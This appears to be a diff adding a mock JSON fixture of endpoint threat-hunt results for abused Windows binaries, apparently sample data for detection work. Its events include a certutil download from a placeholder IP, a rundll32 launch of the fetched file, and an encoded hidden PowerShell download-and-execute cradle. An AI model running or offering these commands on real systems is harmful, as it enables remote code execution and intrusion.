@@ -1,0 +1,59 @@
+{
+  "description": "Sample mock results for endpoint LOLBin hunt",
+  "query_results": [
+    {
+      "query_id": "Q-sample-ep01",
+      "query_text": "event_type = \"process-start\" AND process_name IN (\"certutil.exe\", \"mshta.exe\", \"rundll32.exe\") | where time >= \"2024-12-01 to 2024-12-15\" | head 200",
+      "status": "success",
+      "result_count": 12,
+      "execution_time_ms": 1100,
+      "events": [
+        {
+          "timestamp": "2024-12-05T09:14:22Z",
+          "event_type": "process-start",
+          "user": "SYSTEM",
+          "hostname": "SRV-ENG-03",
+          "process_name": "certutil.exe",
+          "command_line": "certutil -urlcache -split -f http://198.51.100.44/update.bin C:\\Windows\\Temp\\update.bin",
+          "fields": {"parent_process": "cmd.exe", "parent_pid": 4812}
+        },
+        {
+          "timestamp": "2024-12-05T09:15:01Z",
+          "event_type": "process-start",
+          "user": "SYSTEM",
+          "hostname": "SRV-ENG-03",
+          "process_name": "rundll32.exe",
+          "command_line": "rundll32.exe C:\\Windows\\Temp\\update.bin,DllRegisterServer",
+          "fields": {"parent_process": "cmd.exe", "parent_pid": 4812}
+        },
+        {
+          "timestamp": "2024-12-08T11:30:00Z",
+          "event_type": "process-start",
+          "user": "admin.deploy",
+          "hostname": "WS-IT-001",
+          "process_name": "certutil.exe",
+          "command_line": "certutil -addstore Root internal-ca.cer",
+          "fields": {"parent_process": "powershell.exe", "parent_pid": 2200}
+        }
+      ]
+    },
+    {
+      "query_id": "Q-sample-ep02",
+      "query_text": "event_type = \"process-start\" AND process_name = \"powershell.exe\" AND command_line CONTAINS \"-enc\" | where time >= \"2024-12-01 to 2024-12-15\" | head 100",
+      "status": "success",
+      "result_count": 5,
+      "execution_time_ms": 780,
+      "events": [
+        {
+          "timestamp": "2024-12-05T09:12:55Z",
+          "event_type": "process-start",
+          "user": "SYSTEM",
+          "hostname": "SRV-ENG-03",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQANAAvAHMALgBwAHMAMQAnACkA",
+          "fields": {"parent_process": "cmd.exe", "parent_pid": 4800}
+        }
+      ]
+    }
+  ]
+}
